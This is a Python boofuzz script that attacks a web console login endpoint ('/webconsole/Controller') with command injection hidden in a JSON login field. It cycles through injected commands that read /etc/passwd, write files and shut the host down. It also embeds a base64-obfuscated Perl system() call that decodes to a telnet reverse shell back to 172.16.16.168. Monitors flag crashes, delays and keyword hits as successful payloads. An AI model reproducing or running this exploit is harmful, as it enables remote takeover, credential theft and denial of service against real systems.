# -*- coding=utf-8 -*-
import json
import os
import socket
import ssl
import sys
import time

from boofuzz import *

keyword = '400'


class ShareDate:
    def __init__(self):
        self.share_resp = None
        self.t = 0
        self.duration_t = 6
        self.kw = keyword


sd = ShareDate()


class TcpPingMonitor(BaseMonitor):
    def post_send(self, target=None, fuzz_data_logger=None, session=None):
        time.sleep(0.7)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target._target_connection.host, target._target_connection.port))
            return True
        except socket.error as e:
            fuzz_data_logger.log_fail(f"Opening TCP connection failed: {e}")
            fuzz_data_logger.log_check(f"[Bingo!] payload: {session.last_send}")
            fuzz_data_logger.log_check(f"current test_case_count: {fuzz_data_logger.test_case_count}")
            return False
        finally:
            sock.close()

    def get_crash_synopsis(self):
        return "Detected a target can not connection."

    def __repr__(self):
        return "TCP Ping Monitor"


def gt(target, fuzz_data_logger, session, *args, **kwargs):
    sd.t = time.time()


def keyword_check(target, fuzz_data_logger, session, *args, **kwargs):
    fuzz_data_logger.log_info(f"input keywords: {sd.kw}")
    share_resp = sd.share_resp
    try:
        if share_resp:
            fuzz_data_logger.log_check(share_resp)
            if sd.kw in share_resp:
                fuzz_data_logger.log_check(f">>>>> [Bingo!] Find keyword {sd.kw} in response data...")
                fuzz_data_logger.log_check(f"[Bingo!] payload: {session.last_send}")
            fuzz_data_logger.log_check(session.last_send)
    except Exception:
        fuzz_data_logger.log_fail("Unable to connect ...")


def ad(target, fuzz_data_logger, session, *args, **kwargs):
    # get server response
    print('================= ad check server response ===================')
    response = target.recv(2048).decode()
    sd.share_resp = response

    if not response:
        fuzz_data_logger.log_check(f"[Bingo!] payload: {session.last_send}")
        fuzz_data_logger.log_check(f"current test_case_count: {fuzz_data_logger.test_case_count}")

    fuzz_data_logger.log_check(response)
    if "status" in response:
        ret = json.loads(response)
        if ret.get('status') == 200:
            fuzz_data_logger.info(f"[I] normal, status: {ret.get('status')}")
        elif ret.get('status') == "Session Expired":
            fuzz_data_logger.info(f"[I] Session Expired, status: {ret.get('status')}")

    delta_t = time.time() - sd.t
    fuzz_data_logger.log_check(f"[D] cost {delta_t} seconds ...")
    if delta_t >= sd.duration_t:
        fuzz_data_logger.log_check(f"[Attention] delta time > {sd.duration_t} seconds, maybe sleep injection ...")
        fuzz_data_logger.log_check(f"[Bingo!] payload: {session.last_send}")
        fuzz_data_logger.log_check(f"current test_case_count: {fuzz_data_logger.test_case_count}")


def extract_csrf_token(text):
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def main(host, port):
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    auto_db_filename = f"./boofuzz-results/auto_db_{int(time.time())}.db"
    session = Session(target=Target(
        connection=SSLSocketConnection(host=host, port=int(port), sslcontext=ctx, recv_timeout=9),
        monitors=[TcpPingMonitor()]),
        restart_threshold=1,
        post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        pre_send_callbacks=[gt],
        sleep_time=5,
        web_address="0.0.0.0",
        keep_web_open=False,
        db_filename=auto_db_filename,
    )
    session.num_mutations(2)

    s_initialize(name='json_rce')

    s_static('POST ')
    s_static('/webconsole/Controller')
    s_static(' HTTP/1.1')
    s_static('\r\n', name='Request-Line-CRLF')

    s_static(f"Host: {host}:{port}\r\n")
    s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
    s_static("X-Requested-With: XMLHttpRequest\r\n")
    s_static("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
    s_static("Accept: application/json, text/javascript, */*; q=0.01\r\n")
    s_static("DNT: 1\r\n")

    s_static(f"Referer: https://{host}:{port}/webconsole/webpages/login.jsp\r\n")
    s_static("Accept-Encoding: gzip, deflate\r\n")
    s_static("Accept-Language: en-US,en;q=0.5\r\n")
    s_static("Connection: close\r\n")
    s_static(f"Cookie: JSESSIONID=8mlw3uxiwvqv1wqwh554humgo1\r\n")
    # s_static(f"X-Csrf-Token: {token}\r\n")

    s_static(f"Origin: https://{host}:{port}\r\n")

    s_static(f"Content-Length: 486\r\n")

    s_static("\r\n", name="Request-CRLF")

    s_static("mode=151&json=%7B%22username%22%3A%22admin%22%2C%22password%22%3A%22x%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_91%22%2C%22_discriminator%22%3A%7B%22curvalue%22%3A%22;%60")

    # real fuzz logic, input can change in here
    s_group("custom_cmd",  ['cat%20%2Fetc%2Fpasswd%20%2Ftmp', 'id%20%3E%20%2Ftmp%2F11id', 'shutdown -h now', 'id%20%3E%20%2F1122id', 'shutdown%20-h%20now', 'sleep 3'])
    s_static("%60%22%2C%22curKeyDisc%22%3A%7B%22curvalue%22%3A%22applicationfilterpolicyrules;use+MIME::Base64;system(decode_base64('dGVsbmV0IDE3Mi4xNi4xNi4xNjggNjc4OSB8IC9iaW4vc2ggfCB0ZWxuZXQgMTcyLjE2LjE2LjE2OCA4OTY3'))%22%7D%7D%2C%22value%22%3A%22curvalue%22%7D&__RequestType=ajax&t=1711964681628")

    session.connect(s_get('json_rce'))
    session.fuzz(max_depth=1)
    print("---Test Real End Line----")


if __name__ == '__main__':
    # main()
    if len(sys.argv) != 3:
        sys.exit('usage: {} target_ip port'.format(sys.argv[0]))
    print(sys.argv[1], sys.argv[2])

    results_dir = "./boofuzz-results"
    os.makedirs(results_dir, exist_ok=True)

    main(sys.argv[1], sys.argv[2])

